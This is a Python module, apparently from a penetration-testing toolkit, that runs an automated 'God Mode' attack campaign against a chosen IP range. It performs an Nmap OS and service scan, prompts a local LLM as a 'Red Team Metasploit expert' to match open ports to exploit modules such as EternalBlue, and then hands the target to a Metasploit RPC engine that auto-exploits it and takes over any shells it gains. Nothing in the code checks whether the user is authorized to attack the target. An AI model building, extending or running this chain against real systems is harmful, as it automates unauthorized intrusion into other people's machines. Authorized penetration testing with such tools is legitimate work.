"""
modules/god_mode.py — Autonomous Campaign Engine
UPGRADED:
  - AI phase has a configurable timeout (default 60s from config.yaml)
  - If AI times out or is offline, gracefully skips to Phase 3
  - Cleaner phase separation and status reporting
"""

import time
import threading
import questionary
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from core.ui import draw_header, Q_STYLE
from core.database import db
from core.context import ctx

# Import existing engines
from modules.scanner import NmapEngine
from modules.ai_assist import AIEngine
from modules.msf_engine import MetasploitRPCEngine

console = Console()


def _get_ai_timeout() -> int:
    """Read AI timeout from config, default 60 seconds."""
    try:
        from core.context import ctx
        val = ctx.get("AI_TIMEOUT")
        if val:
            return int(val)
    except Exception:
        pass
    return 60


class CampaignEngine:
    def __init__(self):
        self.scanner = NmapEngine()
        self.ai      = AIEngine()
        self.msf     = MetasploitRPCEngine()

    # ── Phase 1: Recon ────────────────────────────────────────────────────────
    def _phase_recon(self, target: str) -> str | None:
        """
        Run full Nmap audit against target.
        Returns a scan_context string for the AI, or None on failure.
        """
        console.print(Panel(
            f"PHASE 1: Target Acquisition ({target})",
            border_style="bold red"))

        if not self.scanner.check_dependencies():
            return None

        console.print("[*] Initiating Full Audit Scan (OS, Services, Scripts)...")
        try:
            with console.status(
                    "[bold cyan]Nmap Engine Active (Full Audit)...[/bold cyan]",
                    spinner="bouncingBar"):
                self.scanner.nm.scan(
                    hosts=target, arguments="-sS -sV -O -sC -T4")
        except Exception as e:
            console.print(f"[bold red][!] Nmap Engine Failure:[/bold red] {e}")
            return None

        hosts = self.scanner.nm.all_hosts()
        if not hosts:
            console.print(
                "[yellow][!] No hosts responded to Phase 1. "
                "Aborting campaign.[/yellow]")
            return None

        scan_context = ""
        for host in hosts:
            state    = self.scanner.nm[host].state()
            os_match = "Unknown OS"
            if (self.scanner.nm[host].get('osmatch')
                    and len(self.scanner.nm[host]['osmatch']) > 0):
                os_match = self.scanner.nm[host]['osmatch'][0]['name']

            console.print(f"[+] Discovered active host: {host} ({state})")
            console.print(
                f"[*] Detected OS: [bold cyan]{os_match}[/bold cyan]")

            scan_context += (
                f"\nTarget Host: {host}\n"
                f"Detected Operating System: {os_match}\n"
                f"Open Ports & Services:\n")

            for proto in self.scanner.nm[host].all_protocols():
                for port in self.scanner.nm[host][proto].keys():
                    pd          = self.scanner.nm[host][proto][port]
                    name        = pd.get('name',      '')
                    product     = pd.get('product',   '')
                    version     = pd.get('version',   '')
                    extrainfo   = pd.get('extrainfo', '')
                    full_info   = f"{product} {version} {extrainfo}".strip() or name
                    info        = (f"Port {port}/{proto} - "
                                   f"Service: {name} - Details: {full_info}")
                    db.log("Campaign-Scanner", host, info, "HIGH")
                    scan_context += f"- {info}\n"

        return scan_context

    # ── Phase 2: AI Analysis (with timeout) ────────────────────────────────────
    def _phase_ai(self, target: str, scan_context: str) -> bool:
        """
        Run AI threat analysis with a hard timeout.
        Returns True if analysis completed, False if skipped/timed out.
        """
        console.print()
        console.print(Panel(
            "PHASE 2: Cortex Threat Analysis",
            border_style="bold magenta"))

        ai_timeout = _get_ai_timeout()

        if not self.ai.check_connection():
            console.print(
                "[yellow][!] Local AI Offline. "
                "Skipping cognitive analysis → proceeding to Phase 3.[/yellow]")
            return False

        models = self.ai.list_models()
        if not models:
            console.print(
                "[yellow][!] No Ollama models installed. "
                "Skipping → Phase 3.[/yellow]")
            console.print(
                "[dim]Run: ollama pull llama3[/dim]")
            return False

        selected_model = questionary.select(
            "Select AI Model for Threat Analysis:",
            choices=models, style=Q_STYLE).ask()

        if not selected_model:
            return False

        self.ai.model = selected_model
        console.print(
            f"\n[*] Feeding telemetry to [cyan]{self.ai.model}[/cyan] "
            f"(timeout: {ai_timeout}s)...")

        system_override = (
            "You are a Red Team Metasploit expert. "
            "Map the provided Nmap scan results to exact Metasploit module paths.\n"
            "CRITICAL: Match the exact Operating System. "
            "Never suggest Windows exploits for Linux, or vice versa.\n\n"
            "Use this EXACT format for your response, one line per port:\n"
            "- Port 21 (FTP): exploit/unix/ftp/vsftpd_234_backdoor\n"
            "- Port 80 (HTTP): exploit/multi/http/tomcat_mgr_upload\n"
            "- Port 445 (SMB): exploit/windows/smb/ms17_010_eternalblue\n\n"
            "Do not write introductions or paragraphs. "
            "Output ONLY the bulleted list of ports and modules."
        )

        user_prompt = (
            f"Analyze these scan results for {target} and map the exploits:\n"
            f"{scan_context}")

        # ── Run AI in a thread with a hard timeout ────────────────────────────
        ai_done   = threading.Event()
        ai_result = {"success": False}

        def _run_ai():
            try:
                self.ai.chat(user_prompt, override_prompt=system_override)
                ai_result["success"] = True
            except Exception as e:
                console.print(
                    f"[dim red][!] AI error: {e}[/dim red]")
            finally:
                ai_done.set()

        ai_thread = threading.Thread(target=_run_ai, daemon=True)
        ai_thread.start()

        # Wait for AI or timeout
        finished = ai_done.wait(timeout=ai_timeout)

        if not finished:
            console.print(
                f"\n[yellow][!] AI timed out after {ai_timeout}s. "
                f"Skipping → Phase 3.[/yellow]")
            console.print(
                "[dim]Tip: increase ai.timeout in config.yaml for slower models.[/dim]")
            return False

        return ai_result["success"]

    # ── Phase 3: Exploitation ──────────────────────────────────────────────────
    def _phase_exploit(self, target: str):
        console.print()
        console.print(Panel(
            "PHASE 3: Exploitation Engine",
            border_style="bold green"))

        execute = questionary.confirm(
            "Hand off to MSF-RPC engine for auto-exploitation?",
            default=True, style=Q_STYLE).ask()

        if not execute:
            console.print("[dim]Phase 3 skipped by operator.[/dim]")
            return

        if not self.msf._check_deps():
            return
        if not self.msf.connect_rpc():
            return

        console.print(
            f"[*] Handoff complete. Launching MSF Engine against {target}...")
        self.msf.auto_exploit()

        console.print("\n[*] Checking for secured shells...")
        self.msf.interact_session()

    # ── Campaign orchestrator ──────────────────────────────────────────────────
    def run(self):
        draw_header("GOD MODE: Autonomous Campaign")

        console.print(
            "[dim]Links Recon → AI Analysis → Exploitation in a single chain.\n"
            "AI phase will automatically skip if offline or timed out.[/dim]\n")

        target = questionary.text(
            "Enter Target IP/CIDR:", style=Q_STYLE).ask()
        if not target:
            return

        ctx.set("RHOST", target)

        # ── Phase 1 ───────────────────────────────────────────────────────────
        scan_context = self._phase_recon(target)
        if not scan_context:
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        console.print(
            f"\n[bold green][+] Phase 1 complete. "
            f"Scan context built ({len(scan_context)} chars).[/bold green]")

        # ── Phase 2 ───────────────────────────────────────────────────────────
        ai_ok = self._phase_ai(target, scan_context)
        if ai_ok:
            console.print(
                "\n[bold green][+] Phase 2 complete. "
                "AI analysis delivered.[/bold green]")
        else:
            console.print(
                "\n[dim][~] Phase 2 skipped — continuing to Phase 3.[/dim]")

        # ── Phase 3 ───────────────────────────────────────────────────────────
        self._phase_exploit(target)

        console.print(
            "\n[bold green][+] Campaign Terminated.[/bold green]")
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()


def run_god_mode():
    CampaignEngine().run()